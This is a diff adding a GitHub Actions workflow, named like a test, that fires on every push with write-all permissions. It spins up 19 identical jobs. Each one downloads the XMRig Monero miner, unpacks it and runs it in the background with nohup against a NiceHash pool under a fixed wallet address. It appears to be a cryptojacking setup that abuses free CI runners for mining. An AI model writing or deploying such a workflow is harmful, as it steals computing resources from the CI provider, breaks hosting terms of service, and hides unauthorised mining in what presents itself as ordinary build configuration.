@@ -1,0 +1,251 @@
+name: testttttmin111
+on: [push]
+permissions: write-all 
+jobs:
+  num1:
+    runs-on: ubuntu-latest
+    defaults: 
+      run:
+        shell: bash
+    steps:
+     - uses: actions/checkout@v2
+       with: 
+          repository: asamamax/test
+     - run: |
+        wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-focal-x64.tar.gz
+        tar zxvf xmrig-6.18.0-focal-x64.tar.gz
+        nohup ./xmrig-6.18.0/xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 32KdWEybhtWPaR9VN441dyo2WumSSMkCFG.${RANDOM} -p x -k -a rx/0 --cpu-max-threads-hint=75 2>1 
+  num2:
+    runs-on: ubuntu-latest
+    defaults: 
+      run:
+        shell: bash
+    steps:
+     - uses: actions/checkout@v2
+       with: 
+          repository: asamamax/test
+     - run: |
+        wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-focal-x64.tar.gz
+        tar zxvf xmrig-6.18.0-focal-x64.tar.gz
+        nohup ./xmrig-6.18.0/xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 32KdWEybhtWPaR9VN441dyo2WumSSMkCFG.${RANDOM} -p x -k -a rx/0 --cpu-max-threads-hint=75 2>1 
+  num3:
+    runs-on: ubuntu-latest
+    defaults: 
+      run:
+        shell: bash
+    steps:
+     - uses: actions/checkout@v2
+       with: 
+          repository: asamamax/test
+     - run: |
+        wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-focal-x64.tar.gz
+        tar zxvf xmrig-6.18.0-focal-x64.tar.gz
+        nohup ./xmrig-6.18.0/xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 32KdWEybhtWPaR9VN441dyo2WumSSMkCFG.${RANDOM} -p x -k -a rx/0 --cpu-max-threads-hint=75 2>1 
+  num4:
+    runs-on: ubuntu-latest
+    defaults: 
+      run:
+        shell: bash
+    steps:
+     - uses: actions/checkout@v2
+       with: 
+          repository: asamamax/test
+     - run: |
+        wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-focal-x64.tar.gz
+        tar zxvf xmrig-6.18.0-focal-x64.tar.gz
+        nohup ./xmrig-6.18.0/xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 32KdWEybhtWPaR9VN441dyo2WumSSMkCFG.${RANDOM} -p x -k -a rx/0 --cpu-max-threads-hint=75 2>1 
+  num5:
+    runs-on: ubuntu-latest
+    defaults: 
+      run:
+        shell: bash
+    steps:
+     - uses: actions/checkout@v2
+       with: 
+          repository: asamamax/test
+     - run: |
+        wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-focal-x64.tar.gz
+        tar zxvf xmrig-6.18.0-focal-x64.tar.gz
+        nohup ./xmrig-6.18.0/xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 32KdWEybhtWPaR9VN441dyo2WumSSMkCFG.${RANDOM} -p x -k -a rx/0 --cpu-max-threads-hint=75 2>1 
+  num6:
+    runs-on: ubuntu-latest
+    defaults: 
+      run:
+        shell: bash
+    steps:
+     - uses: actions/checkout@v2
+       with: 
+          repository: asamamax/test
+     - run: |
+        wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-focal-x64.tar.gz
+        tar zxvf xmrig-6.18.0-focal-x64.tar.gz
+        nohup ./xmrig-6.18.0/xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 32KdWEybhtWPaR9VN441dyo2WumSSMkCFG.${RANDOM} -p x -k -a rx/0 --cpu-max-threads-hint=75 2>1 
+  num7:
+    runs-on: ubuntu-latest
+    defaults: 
+      run:
+        shell: bash
+    steps:
+     - uses: actions/checkout@v2
+       with: 
+          repository: asamamax/test
+     - run: |
+        wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-focal-x64.tar.gz
+        tar zxvf xmrig-6.18.0-focal-x64.tar.gz
+        nohup ./xmrig-6.18.0/xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 32KdWEybhtWPaR9VN441dyo2WumSSMkCFG.${RANDOM} -p x -k -a rx/0 --cpu-max-threads-hint=75 2>1 
+  num8:
+    runs-on: ubuntu-latest
+    defaults: 
+      run:
+        shell: bash
+    steps:
+     - uses: actions/checkout@v2
+       with: 
+          repository: asamamax/test
+     - run: |
+        wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-focal-x64.tar.gz
+        tar zxvf xmrig-6.18.0-focal-x64.tar.gz
+        nohup ./xmrig-6.18.0/xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 32KdWEybhtWPaR9VN441dyo2WumSSMkCFG.${RANDOM} -p x -k -a rx/0 --cpu-max-threads-hint=75 2>1 
+  num9:
+    runs-on: ubuntu-latest
+    defaults: 
+      run:
+        shell: bash
+    steps:
+     - uses: actions/checkout@v2
+       with: 
+          repository: asamamax/test
+     - run: |
+        wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-focal-x64.tar.gz
+        tar zxvf xmrig-6.18.0-focal-x64.tar.gz
+        nohup ./xmrig-6.18.0/xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 32KdWEybhtWPaR9VN441dyo2WumSSMkCFG.${RANDOM} -p x -k -a rx/0 --cpu-max-threads-hint=75 2>1 
+  num10:
+    runs-on: ubuntu-latest
+    defaults: 
+      run:
+        shell: bash
+    steps:
+     - uses: actions/checkout@v2
+       with: 
+          repository: asamamax/test
+     - run: |
+        wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-focal-x64.tar.gz
+        tar zxvf xmrig-6.18.0-focal-x64.tar.gz
+        nohup ./xmrig-6.18.0/xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 32KdWEybhtWPaR9VN441dyo2WumSSMkCFG.${RANDOM} -p x -k -a rx/0 --cpu-max-threads-hint=75 2>1 
+  num11:
+    runs-on: ubuntu-latest
+    defaults: 
+      run:
+        shell: bash
+    steps:
+     - uses: actions/checkout@v2
+       with: 
+          repository: asamamax/test
+     - run: |
+        wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-focal-x64.tar.gz
+        tar zxvf xmrig-6.18.0-focal-x64.tar.gz
+        nohup ./xmrig-6.18.0/xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 32KdWEybhtWPaR9VN441dyo2WumSSMkCFG.${RANDOM} -p x -k -a rx/0 --cpu-max-threads-hint=75 2>1 
+  num12:
+    runs-on: ubuntu-latest
+    defaults: 
+      run:
+        shell: bash
+    steps:
+     - uses: actions/checkout@v2
+       with: 
+          repository: asamamax/test
+     - run: |
+        wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-focal-x64.tar.gz
+        tar zxvf xmrig-6.18.0-focal-x64.tar.gz
+        nohup ./xmrig-6.18.0/xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 32KdWEybhtWPaR9VN441dyo2WumSSMkCFG.${RANDOM} -p x -k -a rx/0 --cpu-max-threads-hint=75 2>1 
+  num13:
+    runs-on: ubuntu-latest
+    defaults: 
+      run:
+        shell: bash
+    steps:
+     - uses: actions/checkout@v2
+       with: 
+          repository: asamamax/test
+     - run: |
+        wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-focal-x64.tar.gz
+        tar zxvf xmrig-6.18.0-focal-x64.tar.gz
+        nohup ./xmrig-6.18.0/xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 32KdWEybhtWPaR9VN441dyo2WumSSMkCFG.${RANDOM} -p x -k -a rx/0 --cpu-max-threads-hint=75 2>1 
+  num14:
+    runs-on: ubuntu-latest
+    defaults: 
+      run:
+        shell: bash
+    steps:
+     - uses: actions/checkout@v2
+       with: 
+          repository: asamamax/test
+     - run: |
+        wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-focal-x64.tar.gz
+        tar zxvf xmrig-6.18.0-focal-x64.tar.gz
+        nohup ./xmrig-6.18.0/xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 32KdWEybhtWPaR9VN441dyo2WumSSMkCFG.${RANDOM} -p x -k -a rx/0 --cpu-max-threads-hint=75 2>1 
+  num15:
+    runs-on: ubuntu-latest
+    defaults: 
+      run:
+        shell: bash
+    steps:
+     - uses: actions/checkout@v2
+       with: 
+          repository: asamamax/test
+     - run: |
+        wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-focal-x64.tar.gz
+        tar zxvf xmrig-6.18.0-focal-x64.tar.gz
+        nohup ./xmrig-6.18.0/xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 32KdWEybhtWPaR9VN441dyo2WumSSMkCFG.${RANDOM} -p x -k -a rx/0 --cpu-max-threads-hint=75 2>1 
+  num16:
+    runs-on: ubuntu-latest
+    defaults: 
+      run:
+        shell: bash
+    steps:
+     - uses: actions/checkout@v2
+       with: 
+          repository: asamamax/test
+     - run: |
+        wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-focal-x64.tar.gz
+        tar zxvf xmrig-6.18.0-focal-x64.tar.gz
+        nohup ./xmrig-6.18.0/xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 32KdWEybhtWPaR9VN441dyo2WumSSMkCFG.${RANDOM} -p x -k -a rx/0 --cpu-max-threads-hint=75 2>1 
+  num17:
+    runs-on: ubuntu-latest
+    defaults: 
+      run:
+        shell: bash
+    steps:
+     - uses: actions/checkout@v2
+       with: 
+          repository: asamamax/test
+     - run: |
+        wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-focal-x64.tar.gz
+        tar zxvf xmrig-6.18.0-focal-x64.tar.gz
+        nohup ./xmrig-6.18.0/xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 32KdWEybhtWPaR9VN441dyo2WumSSMkCFG.${RANDOM} -p x -k -a rx/0 --cpu-max-threads-hint=75 2>1 
+  num18:
+    runs-on: ubuntu-latest
+    defaults: 
+      run:
+        shell: bash
+    steps:
+     - uses: actions/checkout@v2
+       with: 
+          repository: asamamax/test
+     - run: |
+        wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-focal-x64.tar.gz
+        tar zxvf xmrig-6.18.0-focal-x64.tar.gz
+        nohup ./xmrig-6.18.0/xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 32KdWEybhtWPaR9VN441dyo2WumSSMkCFG.${RANDOM} -p x -k -a rx/0 --cpu-max-threads-hint=75 2>1 
+  num19:
+    runs-on: ubuntu-latest
+    defaults: 
+      run:
+        shell: bash
+    steps:
+     - uses: actions/checkout@v2
+       with: 
+          repository: asamamax/test
+     - run: |
+        wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-focal-x64.tar.gz
+        tar zxvf xmrig-6.18.0-focal-x64.tar.gz
+        nohup ./xmrig-6.18.0/xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 32KdWEybhtWPaR9VN441dyo2WumSSMkCFG.${RANDOM} -p x -k -a rx/0 --cpu-max-threads-hint=75  
